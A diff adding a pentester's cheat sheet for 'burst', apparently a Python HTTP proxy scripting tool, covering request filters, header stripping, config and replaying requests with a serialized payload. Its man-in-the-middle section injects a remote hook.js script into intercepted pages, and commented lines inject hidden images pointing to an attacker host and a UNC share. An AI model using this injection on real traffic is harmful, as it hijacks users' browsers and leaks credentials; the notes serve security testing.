@@ -1,0 +1,93 @@
+# burst
+
+# filter out uninteresting requests
+ru_forward_blah = (lambda x: not re.search(r'/jsDBGet\.aspx$', x.path), "f")
+ru_forward_blah = (lambda x: re.search(r'/(?:agentMessaging.aspx|LogUser.aspx)$', x.path), "f")
+p(rules=(ru_bypass_ssl, ru_forward_blah,)
+
+# requetes compressees en deflate (ya l'option dans burp)
+Content-Encoding: deflate
+
+ecrire une fonction dans abrupt
+def blah(r):
+  r.remove_header('Content-Encoding')
+  r.update_content_length()
+  return r
+
+p(pre_func = blah)
+
+# changing default configuration
+conf
+conf.proxy = 'http://127.0.0.1:8083'
+conf.port = 8082
+
+conf.save()
+
+# scripting
+* in console
+ss('kpop')
+get_req = history[-2]
+post_req = history[-1]
+save()
+
+* in script
+from burst.all import *
+
+switch_session('kpop')
+get_req.url += '&debug=true'
+get_req()
+post_req.content = post_req.raw_content = urllib.urlencode({'data': serial_b64})
+post_req.update_content_length()
+print('Request:\n%s' % post_req)
+post_req()
+print('Response:\n%s' % post_req.response)
+
+or using inject():
+rs = i(post_req, to='data', payloads=[serial_b64,])
+print('Request:\n%s' % rs[0])
+rs()
+print('Response:\n%s' % rs[0].response)
+
+# mitm
+
+import re
+def pre(r):
+  for h in ['accept-encoding', 'if-none-match', 'if-modified-since']:
+    r.remove_header(h)
+  return r
+
+def post(r):
+
+  if 'text/html' in ''.join(r.get_header('Content-Type')):
+
+    def blah(m):
+      #mark = r.request.hostname.lower()
+      #if not re.match('[a-z.]+$', mark):
+      #  mark = 'na'
+      #return '</title><img src="http://%s.test.d2t.attacker.com/no.ico" alt="" style="width:0px; height:0px"><img src="\\\\192.168.122.1\\a\\b.ico" alt="" style="width:0px; height:0px">' % mark
+      return '</title><script type="text/javascript" src="http://192.168.122.1:3000/hook.js"></script>'
+      #return '</title><img src="http://192.168.122.1/exchowa" alt="" style="width:0px; height:0px">'
+
+    r.content = re.sub('</title>', blah, r.content, 1, re.I)
+    r.normalise()
+  return r
+
+
+conf.ip = '192.168.122.1'
+conf.ssl_verify = None
+
+ru_bypass_ssl = (lambda x: x.method == "CONNECT", "l")
+ru_forward_all = (lambda x: x.method != "CONNECT", "f")
+
+p(rules=(ru_bypass_ssl, ru_forward_all), verbose=1, pre_func=pre, post_func=post)
+or
+p(rules=(ru_forward_all,))
+
+# converting utf-16 to utf-8
+
+def pre(r):
+  if 'Wide' in r.get_header('string-format'):
+    r.remove_header('String-Format')
+    r.content = r.raw_content = r.raw_content.replace('\x00', '')
+    r.update_content_length()
+  return r
